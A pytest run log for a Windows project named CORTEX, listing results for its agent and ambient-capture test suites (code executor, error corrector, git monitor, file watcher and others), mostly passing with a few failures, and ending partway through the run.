============================= test session starts =============================
platform win32 -- Python 3.13.7, pytest-9.0.0, pluggy-1.6.0 -- D:\PROJECTS\CORTEX\.venv\Scripts\python.exe
cachedir: .pytest_cache
rootdir: D:\PROJECTS\CORTEX
configfile: pytest.ini
testpaths: tests
plugins: cov-7.0.0, mock-3.15.1
collecting ... collected 2117 items / 1 skipped

tests/agents/code_executor/test_backup.py::TestBackupManager::test_manager_initialization PASSED [  0%]
tests/agents/code_executor/test_backup.py::TestBackupManager::test_create_backup_dir PASSED [  0%]
tests/agents/code_executor/test_backup.py::TestBackupManager::test_get_backup_dir_before_creation PASSED [  0%]
tests/agents/code_executor/test_backup.py::TestBackupManager::test_get_backup_dir_after_creation PASSED [  0%]
tests/agents/code_executor/test_backup.py::TestBackupManager::test_backup_file PASSED [  0%]
tests/agents/code_executor/test_backup.py::TestBackupManager::test_backup_nonexistent_file PASSED [  0%]
tests/agents/code_executor/test_backup.py::TestBackupManager::test_backup_without_dir PASSED [  0%]
tests/agents/code_executor/test_backup.py::TestBackupManager::test_restore_file PASSED [  0%]
tests/agents/code_executor/test_backup.py::TestBackupManager::test_restore_nonexistent_backup PASSED [  0%]
tests/agents/code_executor/test_backup.py::TestBackupManager::test_rollback_all PASSED [  0%]
tests/agents/code_executor/test_backup.py::TestBackupManager::test_cleanup PASSED [  0%]
tests/agents/code_executor/test_backup.py::TestBackupManager::test_multiple_backups PASSED [  0%]
tests/agents/code_executor/test_integration.py::TestCodeExecutorIntegration::test_agent_initialization PASSED [  0%]
tests/agents/code_executor/test_integration.py::TestCodeExecutorIntegration::test_can_handle_code_intent PASSED [  0%]
tests/agents/code_executor/test_integration.py::TestCodeExecutorIntegration::test_can_handle_create_file_intent PASSED [  0%]
tests/agents/code_executor/test_integration.py::TestCodeExecutorIntegration::test_cannot_handle_other_intent PASSED [  0%]
tests/agents/code_executor/test_integration.py::TestCodeExecutorIntegration::test_execute_create_operation PASSED [  0%]
tests/agents/code_executor/test_integration.py::TestCodeExecutorIntegration::test_execute_edit_operation PASSED [  0%]
tests/agents/code_executor/test_integration.py::TestCodeExecutorIntegration::test_execute_delete_operation PASSED [  0%]
tests/agents/code_executor/test_integration.py::TestCodeExecutorIntegration::test_execute_batch_operation PASSED [  0%]
tests/agents/code_executor/test_integration.py::TestCodeExecutorIntegration::test_execute_with_validation_failure PASSED [  0%]
tests/agents/code_executor/test_integration.py::TestCodeExecutorIntegration::test_execute_creates_backup PASSED [  1%]
tests/agents/code_executor/test_integration.py::TestCodeExecutorIntegration::test_execute_with_tier1_logging PASSED [  1%]
tests/agents/code_executor/test_integration.py::TestCodeExecutorIntegration::test_response_includes_next_actions PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestCreateOperation::test_create_new_file PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestCreateOperation::test_create_with_existing_file PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestCreateOperation::test_create_with_overwrite PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestCreateOperation::test_create_with_invalid_syntax PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestCreateOperation::test_create_nested_directory PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestEditOperation::test_edit_existing_file PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestEditOperation::test_edit_nonexistent_file PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestEditOperation::test_edit_with_string_replacement PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestEditOperation::test_edit_with_backup PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestEditOperation::test_edit_with_validation_failure PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestDeleteOperation::test_delete_existing_file PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestDeleteOperation::test_delete_without_confirmation PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestDeleteOperation::test_delete_nonexistent_file PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestDeleteOperation::test_delete_with_backup PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestBatchOperation::test_batch_multiple_creates PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestBatchOperation::test_batch_mixed_operations PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestBatchOperation::test_batch_with_failures PASSED [  1%]
tests/agents/code_executor/test_operations.py::TestBatchOperation::test_batch_empty_operations PASSED [  1%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_validator_initialization PASSED [  2%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_should_validate_python PASSED [  2%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_should_validate_javascript PASSED [  2%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_should_validate_typescript PASSED [  2%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_should_not_validate_other_files PASSED [  2%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_validate_valid_python PASSED [  2%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_validate_invalid_python PASSED [  2%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_validate_empty_python PASSED [  2%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_validate_python_with_imports PASSED [  2%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_validate_python_indentation_error PASSED [  2%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_validate_javascript_basic PASSED [  2%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_validate_empty_javascript PASSED [  2%]
tests/agents/code_executor/test_validators.py::TestSyntaxValidator::test_validate_typescript_basic PASSED [  2%]
tests/agents/error_corrector/test_integration.py::TestErrorCorrectorIntegration::test_agent_initialization PASSED [  2%]
tests/agents/error_corrector/test_integration.py::TestErrorCorrectorIntegration::test_can_handle_fix_intent PASSED [  2%]
tests/agents/error_corrector/test_integration.py::TestErrorCorrectorIntegration::test_reject_non_fix_intent PASSED [  2%]
tests/agents/error_corrector/test_integration.py::TestErrorCorrectorIntegration::test_parse_and_fix_indentation_error PASSED [  2%]
tests/agents/error_corrector/test_integration.py::TestErrorCorrectorIntegration::test_parse_and_suggest_import PASSED [  2%]
tests/agents/error_corrector/test_integration.py::TestErrorCorrectorIntegration::test_parse_and_suggest_package_install PASSED [  2%]
tests/agents/error_corrector/test_integration.py::TestErrorCorrectorIntegration::test_protect_cortex_tests PASSED [  2%]
tests/agents/error_corrector/test_integration.py::TestErrorCorrectorIntegration::test_handle_unparseable_error PASSED [  2%]
tests/agents/error_corrector/test_integration.py::TestErrorCorrectorIntegration::test_handle_missing_error_output PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestPytestErrorParser::test_can_parse_pytest_error PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestPytestErrorParser::test_parse_pytest_assertion_error PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestPytestErrorParser::test_parse_pytest_with_test_name PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestSyntaxErrorParser::test_can_parse_syntax_error PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestSyntaxErrorParser::test_parse_indentation_error PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestSyntaxErrorParser::test_parse_invalid_syntax PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestImportErrorParser::test_can_parse_import_error PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestImportErrorParser::test_parse_module_not_found PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestImportErrorParser::test_parse_cannot_import_name PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestRuntimeErrorParser::test_can_parse_runtime_error PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestRuntimeErrorParser::test_parse_name_error PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestRuntimeErrorParser::test_parse_attribute_error PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestLinterErrorParser::test_can_parse_linter_error PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestLinterErrorParser::test_parse_undefined_name PASSED [  3%]
tests/agents/error_corrector/test_parsers.py::TestLinterErrorParser::test_parse_unused_import PASSED [  3%]
tests/agents/error_corrector/test_strategies.py::TestIndentationFixStrategy::test_can_fix_indentation_error PASSED [  3%]
tests/agents/error_corrector/test_strategies.py::TestIndentationFixStrategy::test_fix_indentation PASSED [  3%]
tests/agents/error_corrector/test_strategies.py::TestImportFixStrategy::test_can_fix_import_error PASSED [  3%]
tests/agents/error_corrector/test_strategies.py::TestImportFixStrategy::test_add_known_import PASSED [  3%]
tests/agents/error_corrector/test_strategies.py::TestImportFixStrategy::test_add_unknown_import PASSED [  3%]
tests/agents/error_corrector/test_strategies.py::TestImportFixStrategy::test_remove_unused_import PASSED [  4%]
tests/agents/error_corrector/test_strategies.py::TestSyntaxFixStrategy::test_can_fix_syntax_error PASSED [  4%]
tests/agents/error_corrector/test_strategies.py::TestSyntaxFixStrategy::test_fix_missing_colon PASSED [  4%]
tests/agents/error_corrector/test_strategies.py::TestPackageFixStrategy::test_can_fix_package_error PASSED [  4%]
tests/agents/error_corrector/test_strategies.py::TestPackageFixStrategy::test_suggest_package_install PASSED [  4%]
tests/agents/error_corrector/test_strategies.py::TestPackageFixStrategy::test_suggest_package_from_pattern PASSED [  4%]
tests/agents/error_corrector/test_validators.py::TestPathValidator::test_protected_path_detection PASSED [  4%]
tests/agents/error_corrector/test_validators.py::TestPathValidator::test_empty_protected_paths PASSED [  4%]
tests/agents/error_corrector/test_validators.py::TestPathValidator::test_relative_path_resolution PASSED [  4%]
tests/agents/error_corrector/test_validators.py::TestFixValidator::test_validate_successful_fix PASSED [  4%]
tests/agents/error_corrector/test_validators.py::TestFixValidator::test_validate_fix_with_changes_only PASSED [  4%]
tests/agents/error_corrector/test_validators.py::TestFixValidator::test_validate_failed_fix PASSED [  4%]
tests/agents/error_corrector/test_validators.py::TestFixValidator::test_validate_fix_missing_changes PASSED [  4%]
tests/agents/error_corrector/test_validators.py::TestFixValidator::test_validate_invalid_fixed_content_type PASSED [  4%]
tests/agents/error_corrector/test_validators.py::TestFixValidator::test_is_safe_for_successful_fix PASSED [  4%]
tests/agents/error_corrector/test_validators.py::TestFixValidator::test_is_safe_for_invalid_fix PASSED [  4%]
tests/agents/health_validator/test_integration.py::TestHealthValidatorIntegration::test_agent_initialization PASSED [  4%]
tests/agents/health_validator/test_integration.py::TestHealthValidatorIntegration::test_can_handle_health_check PASSED [  4%]
tests/agents/health_validator/test_integration.py::TestHealthValidatorIntegration::test_can_handle_validate PASSED [  4%]
tests/agents/health_validator/test_integration.py::TestHealthValidatorIntegration::test_cannot_handle_other_intent PASSED [  4%]
tests/agents/health_validator/test_integration.py::TestHealthValidatorIntegration::test_execute_all_passing PASSED [  4%]
tests/agents/health_validator/test_integration.py::TestHealthValidatorIntegration::test_execute_with_failure PASSED [  5%]
tests/agents/health_validator/test_integration.py::TestHealthValidatorIntegration::test_execute_with_warnings PASSED [  5%]
tests/agents/health_validator/test_integration.py::TestHealthValidatorIntegration::test_skip_tests_option PASSED [  5%]
tests/agents/health_validator/test_integration.py::TestHealthValidatorIntegration::test_response_includes_suggestions PASSED [  5%]
tests/agents/health_validator/test_integration.py::TestHealthValidatorIntegration::test_response_includes_metadata PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestResultAnalyzer::test_analyzer_initialization PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestResultAnalyzer::test_analyze_all_passing PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestResultAnalyzer::test_analyze_with_warnings PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestResultAnalyzer::test_analyze_with_errors PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestResultAnalyzer::test_calculate_risk_no_errors PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestResultAnalyzer::test_calculate_risk_critical_failure PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestResultAnalyzer::test_calculate_risk_high_failures PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestReportFormatter::test_formatter_initialization PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestReportFormatter::test_format_healthy_message PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestReportFormatter::test_format_message_with_errors PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestReportFormatter::test_format_message_with_warnings PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestReportFormatter::test_suggest_actions_database_failure PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestReportFormatter::test_suggest_actions_test_failure PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestReportFormatter::test_suggest_actions_git_warning PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestReportFormatter::test_suggest_actions_disk_failure PASSED [  5%]
tests/agents/health_validator/test_reporting.py::TestReportFormatter::test_get_status_icon PASSED [  5%]
tests/agents/health_validator/test_validators.py::TestDatabaseValidator::test_validator_initialization PASSED [  5%]
tests/agents/health_validator/test_validators.py::TestDatabaseValidator::test_check_missing_database PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestDatabaseValidator::test_check_healthy_database PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestDatabaseValidator::test_check_oversized_database PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestDatabaseValidator::test_check_all_databases PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestTestValidator::test_validator_initialization PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestTestValidator::test_successful_test_run PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestTestValidator::test_failed_tests PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestGitValidator::test_validator_initialization PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestGitValidator::test_not_git_repo PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestGitValidator::test_clean_git_status PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestGitValidator::test_many_uncommitted_changes PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestDiskValidator::test_validator_initialization PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestDiskValidator::test_check_disk_space PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestPerformanceValidator::test_validator_initialization PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestPerformanceValidator::test_no_tier3 PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestPerformanceValidator::test_good_performance PASSED [  6%]
tests/agents/health_validator/test_validators.py::TestPerformanceValidator::test_low_performance PASSED [  6%]
tests/agents/test_agent_framework.py::TestAgentRequest::test_create_basic_request PASSED [  6%]
tests/agents/test_agent_framework.py::TestAgentRequest::test_create_request_with_conversation PASSED [  6%]
tests/agents/test_agent_framework.py::TestAgentRequest::test_create_request_with_priority PASSED [  6%]
tests/agents/test_agent_framework.py::TestAgentResponse::test_create_success_response PASSED [  6%]
tests/agents/test_agent_framework.py::TestAgentResponse::test_create_failure_response PASSED [  7%]
tests/agents/test_agent_framework.py::TestAgentResponse::test_response_with_duration PASSED [  7%]
tests/agents/test_agent_framework.py::TestAgentResponse::test_response_with_next_actions PASSED [  7%]
tests/agents/test_agent_framework.py::TestBaseAgent::test_agent_initialization FAILED [  7%]
tests/agents/test_agent_framework.py::TestBaseAgent::test_agent_can_handle PASSED [  7%]
tests/agents/test_agent_framework.py::TestBaseAgent::test_agent_execute PASSED [  7%]
tests/agents/test_agent_framework.py::TestBaseAgent::test_agent_logging PASSED [  7%]
tests/agents/test_agent_framework.py::TestBaseAgent::test_agent_repr PASSED [  7%]
tests/agents/test_agent_framework.py::TestBaseAgent::test_measure_execution PASSED [  7%]
tests/agents/test_agent_framework.py::TestAgentIntegration::test_full_agent_workflow PASSED [  7%]
tests/agents/test_agent_framework.py::TestAgentIntegration::test_agent_with_tier1_interaction PASSED [  7%]
tests/agents/test_agent_framework.py::TestAgentIntegration::test_agent_with_tier2_interaction PASSED [  7%]
tests/agents/test_agent_framework.py::TestAgentIntegration::test_agent_with_tier3_interaction PASSED [  7%]
tests/agents/test_change_governor.py::TestChangeGovernorBasics::test_governor_initialization PASSED [  7%]
tests/agents/test_change_governor.py::TestChangeGovernorBasics::test_governor_can_handle_check_governance PASSED [  7%]
tests/agents/test_change_governor.py::TestChangeGovernorBasics::test_governor_can_handle_assess_risk PASSED [  7%]
tests/agents/test_change_governor.py::TestChangeGovernorBasics::test_governor_rejects_invalid_intent PASSED [  7%]
tests/agents/test_change_governor.py::TestRuleCompliance::test_rule_3_archive_forbidden PASSED [  7%]
tests/agents/test_change_governor.py::TestRuleCompliance::test_rule_20_tdd_required PASSED [  7%]
tests/agents/test_change_governor.py::TestRuleCompliance::test_rule_22_protected_file_deletion PASSED [  7%]
tests/agents/test_change_governor.py::TestRuleCompliance::test_rule_23_incremental_creation PASSED [  7%]
tests/agents/test_change_governor.py::TestRiskAssessment::test_low_risk_simple_modification PASSED [  8%]
tests/agents/test_change_governor.py::TestRiskAssessment::test_medium_risk_multiple_files PASSED [  8%]
tests/agents/test_change_governor.py::TestRiskAssessment::test_high_risk_deletion PASSED [  8%]
tests/agents/test_change_governor.py::TestRiskAssessment::test_high_risk_protected_file PASSED [  8%]
tests/agents/test_change_governor.py::TestRiskAssessment::test_critical_risk_governance_violations PASSED [  8%]
tests/agents/test_change_governor.py::TestMultiRuleValidation::test_multiple_violations PASSED [  8%]
tests/agents/test_change_governor.py::TestMultiRuleValidation::test_tdd_with_tests_provided PASSED [  8%]
tests/agents/test_change_governor.py::TestMultiRuleValidation::test_allowed_with_warnings PASSED [  8%]
tests/agents/test_change_governor.py::TestMultiRuleValidation::test_clean_change_approval PASSED [  8%]
tests/agents/test_commit_handler.py::TestCommitHandlerBasics::test_handler_initialization PASSED [  8%]
tests/agents/test_commit_handler.py::TestCommitHandlerBasics::test_handler_can_handle_commit_intent PASSED [  8%]
tests/agents/test_commit_handler.py::TestCommitHandlerBasics::test_handler_can_handle_git_commit_intent PASSED [  8%]
tests/agents/test_commit_handler.py::TestCommitHandlerBasics::test_handler_rejects_invalid_intent PASSED [  8%]
tests/agents/test_commit_handler.py::TestCommitMessageGeneration::test_generate_feat_commit PASSED [  8%]
tests/agents/test_commit_handler.py::TestCommitMessageGeneration::test_generate_fix_commit PASSED [  8%]
tests/agents/test_commit_handler.py::TestCommitMessageGeneration::test_generate_docs_commit PASSED [  8%]
tests/agents/test_commit_handler.py::TestCommitMessageGeneration::test_infer_commit_type_from_files PASSED [  8%]
tests/agents/test_commit_handler.py::TestGitOperations::test_commit_with_staged_changes PASSED [  8%]
tests/agents/test_commit_handler.py::TestGitOperations::test_no_staged_changes PASSED [  8%]
tests/agents/test_commit_handler.py::TestGitOperations::test_dry_run_mode PASSED [  8%]
tests/agents/test_intent_router.py::TestIntentRouterBasics::test_router_initialization PASSED [  8%]
tests/agents/test_intent_router.py::TestIntentRouterBasics::test_router_can_handle_all_requests PASSED [  9%]
tests/agents/test_intent_router.py::TestIntentClassification::test_classify_planning_intent PASSED [  9%]
tests/agents/test_intent_router.py::TestIntentClassification::test_classify_code_intent PASSED [  9%]
tests/agents/test_intent_router.py::TestIntentClassification::test_classify_test_intent PASSED [  9%]
tests/agents/test_intent_router.py::TestIntentClassification::test_classify_fix_intent PASSED [  9%]
tests/agents/test_intent_router.py::TestIntentClassification::test_classify_unknown_intent PASSED [  9%]
tests/agents/test_intent_router.py::TestIntentClassification::test_preserve_valid_intent PASSED [  9%]
tests/agents/test_intent_router.py::TestRoutingDecisions::test_route_plan_to_planner PASSED [  9%]
tests/agents/test_intent_router.py::TestRoutingDecisions::test_route_code_to_executor PASSED [  9%]
tests/agents/test_intent_router.py::TestRoutingDecisions::test_route_with_multiple_agents PASSED [  9%]
tests/agents/test_intent_router.py::TestRoutingDecisions::test_confidence_scoring PASSED [  9%]
tests/agents/test_intent_router.py::TestTierIntegration::test_query_tier2_for_patterns PASSED [  9%]
tests/agents/test_intent_router.py::TestTierIntegration::test_log_to_tier1_conversation PASSED [  9%]
tests/agents/test_intent_router.py::TestTierIntegration::test_store_routing_pattern_in_tier2 PASSED [  9%]
tests/agents/test_intent_router.py::TestEdgeCases::test_router_without_tier_apis PASSED [  9%]
tests/agents/test_intent_router.py::TestEdgeCases::test_empty_user_message PASSED [  9%]
tests/agents/test_intent_router.py::TestEdgeCases::test_very_long_user_message PASSED [  9%]
tests/agents/test_intent_router.py::TestEdgeCases::test_tier2_search_failure PASSED [  9%]
tests/agents/test_learning_capture_agent.py::TestLearningEvent::test_creates_learning_event PASSED [  9%]
tests/agents/test_learning_capture_agent.py::TestLearningEvent::test_converts_to_lesson_dict PASSED [  9%]
tests/agents/test_learning_capture_agent.py::TestLearningEvent::test_generates_title_from_problem PASSED [  9%]
tests/agents/test_learning_capture_agent.py::TestLearningEvent::test_generates_prevention_rules PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestLearningCaptureAgent::test_initializes_with_project_root PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestLearningCaptureAgent::test_initializes_with_default_root PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestOperationLearningCapture::test_captures_unicode_error_from_operation PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestOperationLearningCapture::test_captures_skull_violation_from_operation PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestOperationLearningCapture::test_captures_module_failure_from_operation PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestOperationLearningCapture::test_returns_none_for_successful_operation PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestExceptionLearningCapture::test_captures_unicode_encode_error PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestExceptionLearningCapture::test_captures_module_not_found_error PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestExceptionLearningCapture::test_returns_none_for_unrecognized_exception PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestAmbientEventLearningCapture::test_captures_from_ambient_terminal_errors PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestAmbientEventLearningCapture::test_ignores_old_ambient_events PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestAmbientEventLearningCapture::test_handles_missing_ambient_log PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestGitCommitLearningCapture::test_captures_from_fix_commit PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestGitCommitLearningCapture::test_ignores_non_fix_commits PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestGitCommitLearningCapture::test_infers_category_from_files PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestLessonSaving::test_saves_lesson_to_yaml PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestLessonSaving::test_generates_unique_ids PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestLessonSaving::test_prevents_duplicate_lessons PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestLessonSaving::test_updates_last_updated_timestamp PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestConvenienceFunctions::test_capture_operation_learning_quick_function PASSED [ 10%]
tests/agents/test_learning_capture_agent.py::TestConvenienceFunctions::test_capture_exception_learning_quick_function PASSED [ 11%]
tests/agents/test_learning_capture_agent.py::TestIntegrationScenarios::test_full_unicode_error_learning_flow PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestScreenshotAnalyzerBasics::test_analyzer_initialization PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestScreenshotAnalyzerBasics::test_analyzer_can_handle_screenshot_intent PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestScreenshotAnalyzerBasics::test_analyzer_can_handle_find_test_ids_intent PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestScreenshotAnalyzerBasics::test_analyzer_rejects_invalid_intent PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestElementIdentification::test_identify_login_page_elements PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestElementIdentification::test_identify_form_elements PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestElementIdentification::test_generic_element_identification PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestTestIDGeneration::test_generate_test_ids PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestTestIDGeneration::test_generate_playwright_selectors PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestTestIDGeneration::test_generate_recommendations PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestErrorHandling::test_missing_image_data PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestErrorHandling::test_invalid_image_format PASSED [ 11%]
tests/agents/test_screenshot_analyzer.py::TestErrorHandling::test_unsupported_image_type PASSED [ 11%]
tests/agents/test_session_resumer.py::TestSessionResumerBasics::test_resumer_initialization PASSED [ 11%]
tests/agents/test_session_resumer.py::TestSessionResumerBasics::test_resumer_can_handle_resume_intent PASSED [ 11%]
tests/agents/test_session_resumer.py::TestSessionResumerBasics::test_resumer_can_handle_restore_intent PASSED [ 11%]
tests/agents/test_session_resumer.py::TestSessionResumerBasics::test_resumer_rejects_invalid_intent PASSED [ 11%]
tests/agents/test_session_resumer.py::TestConversationRestoration::test_restore_conversation_from_tier1 PASSED [ 11%]
tests/agents/test_session_resumer.py::TestConversationRestoration::test_restore_missing_conversation PASSED [ 11%]
tests/agents/test_session_resumer.py::TestConversationRestoration::test_restore_without_conversation_id PASSED [ 11%]
tests/agents/test_session_resumer.py::TestContextReconstruction::test_reconstruct_context_with_files PASSED [ 12%]
tests/agents/test_session_resumer.py::TestContextReconstruction::test_reconstruct_context_with_entities PASSED [ 12%]
tests/agents/test_session_resumer.py::TestContextReconstruction::test_reconstruct_timeline PASSED [ 12%]
tests/ambient/test_debouncer.py::TestDebouncer::test_debouncer_initialization PASSED [ 12%]
tests/ambient/test_debouncer.py::TestDebouncer::test_custom_delay_initialization PASSED [ 12%]
tests/ambient/test_debouncer.py::TestDebouncer::test_buffers_single_event PASSED [ 12%]
tests/ambient/test_debouncer.py::TestDebouncer::test_buffers_multiple_events PASSED [ 12%]
tests/ambient/test_debouncer.py::TestDebouncer::test_resets_timer_on_new_event PASSED [ 12%]
tests/ambient/test_debouncer.py::TestDebouncer::test_merges_duplicate_events PASSED [ 12%]
tests/ambient/test_debouncer.py::TestDebouncer::test_does_not_merge_different_files PASSED [ 12%]
tests/ambient/test_debouncer.py::TestDebouncer::test_writes_to_tier1_on_flush FAILED [ 12%]
tests/ambient/test_debouncer.py::TestDebouncer::test_concurrent_event_handling PASSED [ 12%]
tests/ambient/test_debouncer.py::TestDebouncer::test_clears_buffer_after_flush PASSED [ 12%]
tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_watcher_initialization PASSED [ 12%]
tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_rejects_invalid_workspace PASSED [ 12%]
tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_rejects_file_as_workspace PASSED [ 12%]
tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_detects_file_creation PASSED [ 12%]
tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_detects_file_modification PASSED [ 12%]
tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_ignores_pycache_files PASSED [ 12%]
tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_ignores_git_directory PASSED [ 12%]
tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_only_watches_allowed_extensions PASSED [ 12%]
tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_relative_paths_in_events PASSED [ 13%]
tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_safe_path_validation PASSED [ 13%]
tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_event_contains_timestamp PASSED [ 13%]
tests/ambient/test_file_watcher.py::TestFileWatcherPatterns::test_watch_patterns_includes_common_extensions PASSED [ 13%]
tests/ambient/test_file_watcher.py::TestFileWatcherPatterns::test_ignore_patterns_excludes_build_artifacts PASSED [ 13%]
tests/ambient/test_git_monitor.py::TestGitMonitor::test_monitor_initialization_with_git_repo PASSED [ 13%]
tests/ambient/test_git_monitor.py::TestGitMonitor::test_monitor_initialization_with_non_git_repo PASSED [ 13%]
tests/ambient/test_git_monitor.py::TestGitMonitor::test_rejects_non_existent_path PASSED [ 13%]
tests/ambient/test_git_monitor.py::TestGitMonitor::test_hook_types_whitelist PASSED [ 13%]
tests/ambient/test_git_monitor.py::TestGitMonitor::test_installs_git_hooks PASSED [ 13%]
tests/ambient/test_git_monitor.py::TestGitMonitor::test_hook_script_uses_absolute_paths PASSED [ 13%]
tests/ambient/test_git_monitor.py::TestGitMonitor::test_backs_up_existing_hooks PASSED [ 13%]
tests/ambient/test_git_monitor.py::TestGitMonitor::test_skips_hook_install_if_capture_script_missing PASSED [ 13%]
tests/ambient/test_git_monitor.py::TestGitHookSecurity::test_hook_permissions_are_restricted SKIPPED [ 13%]
tests/ambient/test_git_monitor.py::TestGitHookSecurity::test_hook_script_has_no_variables PASSED [ 13%]
tests/ambient/test_integration.py::TestAmbientCaptureDaemon::test_daemon_initialization PASSED [ 13%]
tests/ambient/test_integration.py::TestAmbientCaptureDaemon::test_git_hooks_installed_on_start PASSED [ 13%]
tests/ambient/test_integration.py::TestAmbientCaptureDaemon::test_captures_file_changes FAILED [ 13%]
tests/ambient/test_integration.py::TestAmbientCaptureDaemon::test_daemon_graceful_shutdown PASSED [ 13%]
tests/ambient/test_integration.py::TestAmbientCaptureDaemon::test_daemon_handles_missing_tier1_database PASSED [ 13%]
tests/ambient/test_integration.py::TestVSCodeTasksIntegration::test_tasks_json_contains_ambient_capture_task PASSED [ 13%]
